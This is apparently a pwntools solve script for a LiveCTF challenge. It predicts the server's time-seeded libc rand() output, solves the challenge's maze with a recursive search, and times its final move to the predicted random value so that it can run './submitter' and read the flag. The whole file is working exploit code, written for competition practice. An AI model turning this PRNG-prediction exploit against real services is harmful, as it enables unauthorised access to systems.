#!/usr/bin/env python3

import ctypes
from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

last_step_out = b''

libc = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
time = libc.time(None)
libc.srand(time)

for i in range(0x24e):
    libc.rand()

io = remote(HOST, int(PORT))
#io = process('../handout/challenge')
io.recvuntil(b'to count ')

# First description
rand_state = libc.rand()
info(f'rand_state = {rand_state >> 0xe & 0xffffffff}')
star_count = int(io.recvuntil(b' stars')[:-6])
info(f'star_count = {star_count}')
io.recvuntil(b'torment: ')

# Get maze
io.sendline(b'a')
io.recvuntil(b'above the maze.\n')
maze = io.recvuntil(b'\n ')

def solve_maze(maze):
    bin_maze = [[0 if c == "#" else 2 if c == "*" else 1 for c in l] for l in maze.splitlines()][:-1]
    (x0, y0) = -1, -1

    def solve_from(x, y, path, visited):
        if bin_maze[y][x] == 2:
            return path
        elif len(path) > 500:
            return None
        elif bin_maze[y][x] == 0:
            return None
    
        if (x + 1, y) not in visited:
            solved = solve_from(x + 1, y, path + "e", visited + [(x + 1, y)])
            if solved:
                return solved
            
        if (x - 1, y) not in visited:
            solved = solve_from(x - 1, y, path + "w", visited + [(x - 1, y)])
            if solved:
                return solved
        
        if (x, y - 1) not in visited:
            solved = solve_from(x, y - 1, path + "n", visited + [(x, y - 1)])
            if solved:
                return solved
        
        if (x, y + 1) not in visited:
            solved = solve_from(x, y + 1, path + "s", visited + [(x, y + 1)])
            if solved:
                return solved
        return None
    
    for i, l in enumerate(maze.splitlines()):
        if "@" in l:
            y0 = i
            x0 = l.find("@")
    
    return solve_from(x0, y0, "", [x0, y0])

def step(direction):
    global last_step_out
    io.sendline(direction)

    # Updating rand state
    rand_state = libc.rand()
    info(f'rand_state = {rand_state >> 0xe & 0xffffffff}')
    io.recvuntil(b'to count ')
    star_count = int(io.recvuntil(b' stars')[:-6])
    info(f'star_count = {star_count}')
    last_step_out = io.recvuntil(b'torment: ')

path = solve_maze(maze.decode())
for s in path[:-1]:
    step(s.encode())

while True:
    rand_state = libc.rand()
    if rand_state % 1213 == 1212:
        break

    io.sendline(b'x')

    # Updating rand state
    info(f'rand_state = {rand_state >> 0xe & 0xffffffff}')
    io.recvuntil(b'to count ')
    star_count = int(io.recvuntil(b' stars')[:-6])
    info(f'star_count = {star_count}')
    last_step_out = io.recvuntil(b'torment: ')

io.sendline(path[-1].encode())
io.recvuntil(b'You have solved the maze!\n')
io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
info(f'Flag: {flag}')
io.close()
